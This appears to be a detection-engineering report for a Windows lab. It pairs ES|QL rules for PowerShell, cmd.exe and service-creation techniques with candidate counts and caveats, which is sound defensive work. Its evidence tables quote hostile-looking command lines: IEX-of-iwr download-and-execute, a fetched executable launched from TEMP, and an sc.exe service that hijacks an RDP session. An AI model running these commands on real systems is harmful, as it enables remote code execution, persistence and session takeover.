# Individual detection results

Validated UTC: 2026-09-16T12:50:04.356335+00:00. Live verification passed.

All retained historical documents; no wall-clock or annotation/scenario predicate. Missing timestamps remain eligible for individual rules.

Full COUNT(*) before the export LIMIT guards truncation. Exact distinct IDs and hosts use complete returned sets, not approximate cardinality. Every query is replayed; all IDs and claimed fields are verified against live source projections. Refined sets are independently checked against their paired baseline source events.

All counts below use distinct event.id; these are detection candidates, not attacks.

| Query / cohort | Raw rows | Distinct IDs | Hosts | Timed / undated | First / last UTC |
|---|---:|---:|---:|---|---|
| powershell_baseline / process_creation | 2060 | 2060 | 3 | 2060 / 0 | 2024-11-05T10:42:56.3186326Z / 2024-12-22T09:13:51.694757Z |
| powershell_refined / process_creation | 290 | 290 | 3 | 290 / 0 | 2024-11-05T11:03:49.493885Z / 2024-12-15T13:42:34.2637507Z |
| powershell_kql_review / process_review | 2060 | 2060 | 3 | 2060 / 0 | 2024-11-05T10:42:56.3186326Z / 2024-12-22T09:13:51.694757Z |
| shell_baseline / process_creation | 7717 | 7717 | 3 | 7717 / 0 | 2024-11-05T10:48:57.8075783Z / 2024-12-22T12:53:50.1888457Z |
| shell_refined / process_creation | 172 | 172 | 3 | 172 / 0 | 2024-11-05T13:34:51.2080098Z / 2024-12-14T17:30:59.5689515Z |
| shell_kql_review / process_review | 7717 | 7717 | 3 | 7717 / 0 | 2024-11-05T10:48:57.8075783Z / 2024-12-22T12:53:50.1888457Z |
| service_installation / service_installation | 102 | 102 | 4 | 102 / 0 | 2024-11-05T10:54:14.4669595Z / 2024-12-22T11:05:33.0936847Z |
| service_create_baseline / service_create_process | 155 | 155 | 3 | 155 / 0 | 2024-11-05T13:35:33.3145881Z / 2024-12-14T09:01:47.5042143Z |
| service_create_refined / service_create_process | 41 | 41 | 3 | 41 / 0 | 2024-11-06T09:58:51.2110964Z / 2024-12-13T00:13:35.9641019Z |
| service_config_baseline / service_config_process | 117 | 117 | 3 | 117 / 0 | 2024-11-05T13:34:51.2709569Z / 2024-12-14T17:30:59.7729986Z |
| service_config_refined / service_config_process | 108 | 108 | 3 | 108 / 0 | 2024-11-05T13:34:51.2709569Z / 2024-12-14T17:30:59.7729986Z |
| service_registry / registry_write | 708 | 708 | 3 | 708 / 0 | 2024-11-05T10:39:32.6261111Z / 2024-12-22T12:53:49.226296Z |
| service_kql_review / process_review | 523 | 523 | 3 | 523 / 0 | 2024-11-05T11:09:46.3661874Z / 2024-12-14T17:30:59.7729986Z |

## T1059.001 — PowerShell

PowerShell process creation whose same command contains retrieval plus execution indicators, or hidden window plus no-profile and inline command switches. No separate event is required.

Tactics: Execution. Coarse process/command-presence review filter only; not equivalent to refined ES|QL. KQL cannot reproduce TO_LOWER plus token-pattern logic faithfully.

### powershell_baseline

Query source: [baseline.esql](../../detections/technique-1/baseline.esql). Role: baseline.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe")
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Representative IDs: `002f1cdedcb6eb7b3c38aa893f0dc17477349ec2cb8025809c7b2bacf5d73b8a`, `00649d6fac554a175d0ac58240f6fc24f27b655cb1c50954613d06240a8185f3`, `0066190b12b83ffe035fff88665746a6b8b427f0dff3f4a460348aa900abfbc7`.

### powershell_refined

Query source: [detection.esql](../../detections/technique-1/detection.esql). Role: refined.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe")
| EVAL command_lc = TO_LOWER(COALESCE(process.command_line, ""))
| EVAL retrieval = command_lc RLIKE ".*(invoke-webrequest|downloadstring|downloadfile|[^a-z0-9_]iwr[^a-z0-9_]).*",
    execution = command_lc RLIKE ".*(invoke-expression|[^a-z0-9_]iex[^a-z0-9_]|start-process).*",
    hidden = command_lc RLIKE ".*[ ]-(w|windowstyle)[ ]+hidden([ ].*)?",
    no_profile = command_lc RLIKE ".*[ ]-(nop|noprofile)([ ].*)?",
    inline_command = command_lc RLIKE ".*[ ]-(c|command)[ ]+.*"
| WHERE (retrieval AND execution) OR (hidden AND no_profile AND inline_command)
| KEEP event.id, @timestamp, host.name, retrieval, execution, hidden, no_profile, inline_command
| SORT event.id ASC
| LIMIT 10000
```

Candidate volume: **2060 → 290** within `process_creation`; 1770 baseline events excluded. This is not a measured false-positive reduction.

Observed signal/branch counts (may overlap): `{'retrieval_and_execution': 287, 'hidden_no_profile_inline': 3}`.

Representative IDs: `0139e7fcfc5b9bffc583128a7d46c35f829d2c075cd365dd94c606ba7d04ff81`, `02dd549303cf8ecf28c09e4889489270e83633166d02f5e0802da5b40435fcf5`, `02f17931b2999dd857b387b8e4f86d834143382d7d8948456029e2571254a791`, `0405e4890856e5219b7621b29478f2b59633624262f74dead0771d6dee3f2691`, `04fe2480cf829f94e59e56ad57c500219894f757d622d67f8b4ab4a250c181d1`, `3faf8b4d35dd5fcb924ed44ed7e10d944f2b84243f9bf6f98c07b4e4b4d8d00d`, `c87894aacb7c79e770e4eb8b1fd95fcf9612bb5fddba0c3f00edea3a9a9d6634`.

### powershell_kql_review

Query source: [detection.kql](../../detections/technique-1/detection.kql). Role: review_filter.

Representative IDs: `002f1cdedcb6eb7b3c38aa893f0dc17477349ec2cb8025809c7b2bacf5d73b8a`, `00649d6fac554a175d0ac58240f6fc24f27b655cb1c50954613d06240a8185f3`, `0066190b12b83ffe035fff88665746a6b8b427f0dff3f4a460348aa900abfbc7`.

### Representative evidence and comparisons

Full commands, parent fields and source-file/row/hash provenance are in [detection-results.json](detection-results.json). Excerpts below are display-only.

| Event ID | UTC / host | Command or service object excerpt |
|---|---|---|
| `0139e7fcfc5b9bffc583128a7d46c35f829d2c075cd365dd94c606ba7d04ff81` | 2024-12-04T06:47:52.485170700Z / DESKTOP-QGB4EQH | powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalD |
| `02dd549303cf8ecf28c09e4889489270e83633166d02f5e0802da5b40435fcf5` | 2024-12-14T06:47:02.130478200Z / DESKTOP-QGB4EQH | powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalD |
| `02f17931b2999dd857b387b8e4f86d834143382d7d8948456029e2571254a791` | 2024-12-13T15:01:25.391866200Z / DESKTOP-QGB4EQH | powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalD |
| `0405e4890856e5219b7621b29478f2b59633624262f74dead0771d6dee3f2691` | 2024-12-13T15:27:09.301240800Z / DESKTOP-QGB4EQH | \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -outfile $env:TEMP\\a.exe;start |
| `04fe2480cf829f94e59e56ad57c500219894f757d622d67f8b4ab4a250c181d1` | 2024-12-09T19:38:53.952567300Z / DESKTOP-QGB4EQH | powershell.exe -ExecutionPolicy Bypass -C \"Write-Host 1.Downloading KeyScrambler from official website to temp directory; Invoke-WebRequest -Uri \\\"https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe\\\" -OutFile $env: |
| `3faf8b4d35dd5fcb924ed44ed7e10d944f2b84243f9bf6f98c07b4e4b4d8d00d` | 2024-11-09T19:19:38.535734500Z / DESKTOP-FMI6MML | powershell.exe  -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt |
| `4ea94313bd0565c1a29ba059663e5824ebe4f2b9a7e25e1430f451017feef75c` | 2024-12-11T18:42:39.678206100Z / DESKTOP-QGB4EQH | powershell.exe -ExecutionPolicy Bypass -C \"$owners = @{};gwmi win32_process \|%% {$owners[$_.handle] = $_.getowner().user};$ps = get-process \| select processname,Id,@{l=\\\"Owner\\\";e={$owners[$_.id.tostring()]}};foreach($p in $ps) {    if |
| `c87894aacb7c79e770e4eb8b1fd95fcf9612bb5fddba0c3f00edea3a9a9d6634` | 2024-11-06T09:58:51.250364500Z / DESKTOP-DS4FBF4 | powershell.exe  -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt |

- `4ea94313bd0565c1a29ba059663e5824ebe4f2b9a7e25e1430f451017feef75c`: Process inventory with Bypass has routine command semantics; its Public-directory splunkd.exe parent remains suspicious. Ambiguous comparison, not a known benign event.

False-positive candidates:

- Approved download-and-run administration or software bootstrap scripts
- Authorized hidden automation and marker-file tests
- Quoted, commented or echoed indicators without executing the represented action

False-negative/evasion and telemetry limitations:

- Native PowerShell 400/403/4103/4104 telemetry absent
- Renamed or in-process PowerShell and encoded-only commands
- Aliases, alternate spacing, string construction and missing command content
- Downloads and execution split across events are intentionally outside this rule

ATT&CK/CAR references (accessed 2026-09-13 UTC): [reference 1](https://attack.mitre.org/techniques/T1059/001/), [reference 2](https://attack.mitre.org/detectionstrategies/DET0455/), [reference 3](https://car.mitre.org/analytics/CAR-2014-04-003/).


## T1059.003 — Windows Command Shell

cmd.exe process creation whose same record has services.exe ancestry plus a PowerShell executable in its command, or an sc create/config command assigning an interpreter-valued binPath.

Tactics: Execution. Coarse process/command-presence review filter only; not equivalent to refined ES|QL. KQL cannot reproduce TO_LOWER plus token-pattern logic faithfully.

### shell_baseline

Query source: [baseline.esql](../../detections/technique-2/baseline.esql). Role: baseline.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) == "cmd.exe"
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Representative IDs: `001a7b013da5c17ceaeb3432a5ad5f42a02beb00bac54e887d583bcd78c14f3f`, `001ca3f6d61272e166d9dbb55f7a5c5419a733924093e066604bcaf9e852f98c`, `0021bec99a9f5246b874b146fcfc0c158e3bd06241e981038dfeed599e389ff8`.

### shell_refined

Query source: [detection.esql](../../detections/technique-2/detection.esql). Role: refined.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) == "cmd.exe"
| EVAL command_lc = TO_LOWER(COALESCE(process.command_line, ""))
| EVAL service_parent_interpreter = TO_LOWER(COALESCE(process.parent.name, "")) == "services.exe"
        AND command_lc RLIKE ".*(powershell[.]exe|pwsh[.]exe).*",
    service_control_interpreter = command_lc RLIKE ".*[ ]sc([.]exe)?[ ]+(create|config)[ ]+.*binpath=.*(cmd[.]exe|powershell[.]exe|pwsh[.]exe).*"
| WHERE service_parent_interpreter OR service_control_interpreter
| KEEP event.id, @timestamp, host.name, service_parent_interpreter, service_control_interpreter
| SORT event.id ASC
| LIMIT 10000
```

Candidate volume: **7717 → 172** within `process_creation`; 7545 baseline events excluded. This is not a measured false-positive reduction.

Observed signal/branch counts (may overlap): `{'inline_command': 149, 'service_control_interpreter': 169, 'interpreter_binpath': 169, 'hidden': 44, 'no_profile': 44, 'service_parent_interpreter': 3}`.

Representative IDs: `047897958bacb22c374a7cd75e00d1ff4d497cf10a2c562dde718589d51006ca`, `055b3470e33ad8428e2722bf6a4fb91b1eab9d551fece613b640d0bc07e56b6a`, `06f0d193d8dd0da11d81c1add210986ddb1b8b96ae4f25c5ec56922d117dd795`, `0987d7574011fcd5f3c4d18b35651f0d15c32418de57eefc6d473d74393a1f7f`, `0cf1e60d119adbef05895cb6e3698cdf44991cfcdfc9f9b933ec4a5694892572`, `1ed1ce25b37d60a6adc53a87b8058e51ff77a620b04b333d6bff9d7fad766ec6`, `3154fbb47b3c3efd78fe60f5d197b960a91a267fc38c8db272196e38c200c358`, `8f0564e44cea0da1038e46484c816a8668ee890529fcc83432f6c830a64d3e90`, `c5a93a534cf031f5789b321d070b3f6cf33ec3e79e50b72cf15e384b7821e8e4`.

### shell_kql_review

Query source: [detection.kql](../../detections/technique-2/detection.kql). Role: review_filter.

Representative IDs: `001a7b013da5c17ceaeb3432a5ad5f42a02beb00bac54e887d583bcd78c14f3f`, `001ca3f6d61272e166d9dbb55f7a5c5419a733924093e066604bcaf9e852f98c`, `0021bec99a9f5246b874b146fcfc0c158e3bd06241e981038dfeed599e389ff8`.

### Representative evidence and comparisons

Full commands, parent fields and source-file/row/hash provenance are in [detection-results.json](detection-results.json). Excerpts below are display-only.

| Event ID | UTC / host | Command or service object excerpt |
|---|---|---|
| `013759f2600917245402d8f22e97bde725d1262bdd8b0a6ec1ba03f28de52002` | 2024-12-02T22:15:58.975210700Z / DESKTOP-QGB4EQH | c:\\windows\\system32\\cmd.exe  /c cd /d C:\\Users\\mari\\AppData\\Local\\Temp\\ |
| `047897958bacb22c374a7cd75e00d1ff4d497cf10a2c562dde718589d51006ca` | 2024-12-06T18:44:20.081306900Z / DESKTOP-FMI6MML | cmd.exe /C sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" &amp;&amp; sc start Fax |
| `055b3470e33ad8428e2722bf6a4fb91b1eab9d551fece613b640d0bc07e56b6a` | 2024-12-09T22:31:07.769523100Z / DESKTOP-QGB4EQH | cmd.exe /C sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" &amp;&amp; sc start Fax |
| `06f0d193d8dd0da11d81c1add210986ddb1b8b96ae4f25c5ec56922d117dd795` | 2024-12-02T22:17:08.768651200Z / DESKTOP-FMI6MML | cmd.exe /C sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" &amp;&amp; sc start Fax |
| `0987d7574011fcd5f3c4d18b35651f0d15c32418de57eefc6d473d74393a1f7f` | 2024-12-02T13:08:59.566643800Z / DESKTOP-QGB4EQH | cmd.exe /C sc.exe create ARTService binPath= \"%%COMSPEC%% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" &amp;&amp; sc.exe start ARTService &amp;&amp; sc.exe delete ARTService |
| `0cf1e60d119adbef05895cb6e3698cdf44991cfcdfc9f9b933ec4a5694892572` | 2024-12-02T22:38:16.660229400Z / DESKTOP-QGB4EQH | cmd.exe /C sc.exe create ARTService binPath= \"%%COMSPEC%% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" &amp;&amp; sc.exe start ARTService &amp;&amp; sc.exe delete ARTService |
| `1ed1ce25b37d60a6adc53a87b8058e51ff77a620b04b333d6bff9d7fad766ec6` | 2024-12-13T01:25:49.130794800Z / DESKTOP-QGB4EQH | cmd.exe /C query user &amp;&amp; sc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\" &amp;&amp; net start sesshijack |
| `3154fbb47b3c3efd78fe60f5d197b960a91a267fc38c8db272196e38c200c358` | 2024-11-25T23:07:50.027718700Z / DESKTOP-QGB4EQH | C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt |
| `8f0564e44cea0da1038e46484c816a8668ee890529fcc83432f6c830a64d3e90` | 2024-11-09T19:19:38.522452Z / DESKTOP-FMI6MML | C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt |
| `c5a93a534cf031f5789b321d070b3f6cf33ec3e79e50b72cf15e384b7821e8e4` | 2024-11-06T09:58:51.235401Z / DESKTOP-DS4FBF4 | C:\\WINDOWS\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt |

- `013759f2600917245402d8f22e97bde725d1262bdd8b0a6ec1ba03f28de52002`: Directory-changing shell command has a routine explanation. Retain ancestry; not independently certified benign.

False-positive candidates:

- Authorized service wrappers and maintenance scripts
- Approved changes assigning interpreters to service commands
- Quoted/echoed commands; substring presence is not full shell parsing

False-negative/evasion and telemetry limitations:

- Renamed cmd.exe, missing command/parent fields or unsupported quoting/spacing
- Absolute or remote sc invocation forms outside the literal command pattern
- Other shell abuse unrelated to service mechanisms remains outside this refinement

ATT&CK/CAR references (accessed 2026-09-13 UTC): [reference 1](https://attack.mitre.org/techniques/T1059/003/), [reference 2](https://attack.mitre.org/detectionstrategies/DET0202/), [reference 3](https://car.mitre.org/analytics/CAR-2014-11-002/), [reference 4](https://car.mitre.org/analytics/CAR-2014-05-002/).


## T1543.003 — Windows Service

Separate sc.exe create and config process variants with an interpreter mentioned after binPath=. SCM 7045 and Services ImagePath writes remain distinct observational baselines; no searchable installation-object refinement is claimed.

Tactics: Persistence, Privilege Escalation. Coarse process/command-presence review filter only; not equivalent to refined ES|QL. KQL cannot reproduce TO_LOWER plus token-pattern logic faithfully.

### service_installation

Query source: [baseline.esql](../../detections/technique-3/baseline.esql). Role: baseline.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Service Control Manager" AND event.code == "7045"
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Representative IDs: `0213192542e4d0897f86e0572722fb228d413a313b3347a86eb62d6316e3a21f`, `07e713a6eb27af8bd048ea0f68493667e19861d79a377a8a104e8224bfdcc7d9`, `0832b2e233cb90b01cd012a0b8491cf67eccf69a1291434284507a26907d0cdd`.

### service_create_baseline

Query source: [baseline-create.esql](../../detections/technique-3/baseline-create.esql). Role: comparison_baseline.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) == "sc.exe"
    AND TO_LOWER(COALESCE(process.command_line, "")) LIKE "* create *"
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Representative IDs: `01a39aaa0ab4f30ba0883fad92598d99a9347baed6a395936abbda41ae2bd09a`, `0487faae790fdea3e8ddbe6d23a87a7cd485da163032b1e9b4a5959adff6f555`, `0542c8f7e5db8c34a87e5c25a8d9c9979595d8bd2aebfa8192480c028e3de65e`.

### service_create_refined

Query source: [detection.esql](../../detections/technique-3/detection.esql). Role: refined.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) == "sc.exe"
| EVAL command_lc = TO_LOWER(COALESCE(process.command_line, ""))
| WHERE command_lc LIKE "* create *"
    AND command_lc RLIKE ".*binpath=.*(cmd[.]exe|powershell[.]exe|pwsh[.]exe).*"
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Candidate volume: **155 → 41** within `service_create_process`; 114 baseline events excluded. This is not a measured false-positive reduction.

Observed signal/branch counts (may overlap): `{'hidden': 41, 'no_profile': 41, 'inline_command': 41, 'interpreter_binpath': 41}`.

Representative IDs: `01a39aaa0ab4f30ba0883fad92598d99a9347baed6a395936abbda41ae2bd09a`, `0542c8f7e5db8c34a87e5c25a8d9c9979595d8bd2aebfa8192480c028e3de65e`, `0d566de0e79482d2096f08c9f36e892a5b926f4c0bb1bb88cedc5bb439390316`.

### service_config_baseline

Query source: [baseline-config.esql](../../detections/technique-3/baseline-config.esql). Role: comparison_baseline.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) == "sc.exe"
    AND TO_LOWER(COALESCE(process.command_line, "")) LIKE "* config *"
    AND TO_LOWER(COALESCE(process.command_line, "")) LIKE "*binpath=*"
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Representative IDs: `014b4475343bcdf621c664c5caf7d29448162ee516d406ce2048197e2ae9540f`, `01b253be11116c9c6d4b6dac1192fa3942555144a48a8820dd650515646c472c`, `045a928860fec7b58ea4de7d7d01a795ae9ee85fdb411c76faadc571d0177f2c`.

### service_config_refined

Query source: [detection-config.esql](../../detections/technique-3/detection-config.esql). Role: refined.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "1"
    AND TO_LOWER(process.name) == "sc.exe"
| EVAL command_lc = TO_LOWER(COALESCE(process.command_line, ""))
| WHERE command_lc LIKE "* config *"
    AND command_lc RLIKE ".*binpath=.*(cmd[.]exe|powershell[.]exe|pwsh[.]exe).*"
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Candidate volume: **117 → 108** within `service_config_process`; 9 baseline events excluded. This is not a measured false-positive reduction.

Observed signal/branch counts (may overlap): `{'inline_command': 108, 'interpreter_binpath': 108}`.

Representative IDs: `014b4475343bcdf621c664c5caf7d29448162ee516d406ce2048197e2ae9540f`, `01b253be11116c9c6d4b6dac1192fa3942555144a48a8820dd650515646c472c`, `045a928860fec7b58ea4de7d7d01a795ae9ee85fdb411c76faadc571d0177f2c`.

### service_registry

Query source: [baseline-registry.esql](../../detections/technique-3/baseline-registry.esql). Role: supporting_baseline.

```esql
FROM windows-apt-events-*
| WHERE event.provider == "Microsoft-Windows-Sysmon" AND event.code == "13"
    AND TO_LOWER(registry.path) LIKE "*currentcontrolset*services*imagepath"
| KEEP event.id, @timestamp, host.name
| SORT event.id ASC
| LIMIT 10000
```

Representative IDs: `0003471104182867c330e6864c1f64de47457d6924783197ac3467c026d3eaae`, `007d1b3bc7f49e0a6751c4040c6de35f46bbc30610ad6d35d40f887d627780bf`, `00bbc0658741b4b0dd75628aca677a084d178019764d26d68e02cfc19c2355dc`.

### service_kql_review

Query source: [detection.kql](../../detections/technique-3/detection.kql). Role: review_filter.

Representative IDs: `004a1b995cd33acfcb1787a083e6c5192bd15691e23db26d2b11dc4c05fd888e`, `014b4475343bcdf621c664c5caf7d29448162ee516d406ce2048197e2ae9540f`, `01a39aaa0ab4f30ba0883fad92598d99a9347baed6a395936abbda41ae2bd09a`.

### Representative evidence and comparisons

Full commands, parent fields and source-file/row/hash provenance are in [detection-results.json](detection-results.json). Excerpts below are display-only.

| Event ID | UTC / host | Command or service object excerpt |
|---|---|---|
| `014b4475343bcdf621c664c5caf7d29448162ee516d406ce2048197e2ae9540f` | 2024-12-03T11:27:20.607512100Z / DESKTOP-QGB4EQH | sc  config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" |
| `01a39aaa0ab4f30ba0883fad92598d99a9347baed6a395936abbda41ae2bd09a` | 2024-12-10T10:50:27.384701800Z / DESKTOP-QGB4EQH | sc.exe  create ARTService binPath= \"C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" |
| `01b253be11116c9c6d4b6dac1192fa3942555144a48a8820dd650515646c472c` | 2024-12-13T00:08:09.737116500Z / DESKTOP-QGB4EQH | sc  config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" |
| `045a928860fec7b58ea4de7d7d01a795ae9ee85fdb411c76faadc571d0177f2c` | 2024-12-09T19:31:36.639354200Z / DESKTOP-QGB4EQH | sc  config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" |
| `0487faae790fdea3e8ddbe6d23a87a7cd485da163032b1e9b4a5959adff6f555` | 2024-12-01T07:11:34.391008800Z / DESKTOP-QGB4EQH | sc.exe  create AtomicTestService_CMD binPath= \"411da5_AtomicService.exe\" start=auto  type=Own |
| `0542c8f7e5db8c34a87e5c25a8d9c9979595d8bd2aebfa8192480c028e3de65e` | 2024-12-06T20:17:08.686070100Z / DESKTOP-FMI6MML | sc.exe  create ARTService binPath= \"C:\\WINDOWS\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" |
| `078a375e7354cdc8386ff93052945d498573e06a1f989587a7e6368899b659ff` | 2024-11-09T09:32:01.626248500Z / DESKTOP-FMI6MML | sc  config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" |
| `0b1f6f98acb0185bf38e6311eff2d76c0f98da7c178dea8dbe3fecc074ab9f7e` | 2024-11-30T08:00:19.224659200Z / DESKTOP-FMI6MML | C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\{6F0E3FA5-EAF3-4CB3-B04A-315F93631A12}\\MpKslDrv.sys |
| `0d566de0e79482d2096f08c9f36e892a5b926f4c0bb1bb88cedc5bb439390316` | 2024-12-13T00:13:35.964101900Z / DESKTOP-QGB4EQH | sc.exe  create ARTService binPath= \"C:\\WINDOWS\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\" |

- `0b1f6f98acb0185bf38e6311eff2d76c0f98da7c178dea8dbe3fecc074ab9f7e`: SCM installation uses a Defender Definition Updates driver path. Plausible legitimate update; path appearance is not signature or trust verification.
- `078a375e7354cdc8386ff93052945d498573e06a1f989587a7e6368899b659ff`: sc config Fax assigns fxssvc.exe, consistent with restoring a service binary. Context/authorization is unverified.
- `0487faae790fdea3e8ddbe6d23a87a7cd485da163032b1e9b4a5959adff6f555`: Creation of an AtomicTestService_CMD executable service is excluded because the configured binary is not an interpreter. This illustrates a coverage gap, not a benign verdict.

False-positive candidates:

- Approved service tests, maintenance and interpreter-based service wrappers
- Legitimate Defender/driver and software-update installations in the separate SCM baseline
- An interpreter string in a quoted argument may not be the actual service executable

False-negative/evasion and telemetry limitations:

- Security 4697 absent; SCM object fields preserved but unindexed
- API/PowerShell service modifications bypass the sc.exe process variants
- Services using direct executables instead of interpreters, including genuinely suspicious creations, are excluded
- Interpreter mention is not proof of service startup, outcome or persistence

ATT&CK/CAR references (accessed 2026-09-13 UTC): [reference 1](https://attack.mitre.org/techniques/T1543/003/), [reference 2](https://attack.mitre.org/detectionstrategies/DET0552/), [reference 3](https://car.mitre.org/analytics/CAR-2014-05-002/), [reference 4](https://car.mitre.org/analytics/CAR-2013-09-005/).

## Limits and reproduction

- Candidate-volume changes are not measured false-positive or false-negative changes.
- KQL files are coarse review filters; refined ES|QL is authoritative.
- No final correlation, Security rule installation or dashboard is included.
- Queries cover the historical corpus; null fields fail positive conditions safely.
- The runner fails rather than accepting an export truncated by ES|QL row limits.
- Service installation, create/config commands and registry units remain separate.
- Command patterns show visible intent; quoted strings and comments can still match.

From the repository root with the verified local stack running:

```powershell
.\.venv\Scripts\python.exe scripts/validate_ingestion.py --output-directory analysis/detections/prerequisites
.\.venv\Scripts\python.exe scripts/verify_technique_selection.py
.\.venv\Scripts\python.exe scripts/run_individual_detections.py
```

The separate correlation report contains the completed multi-event analysis.
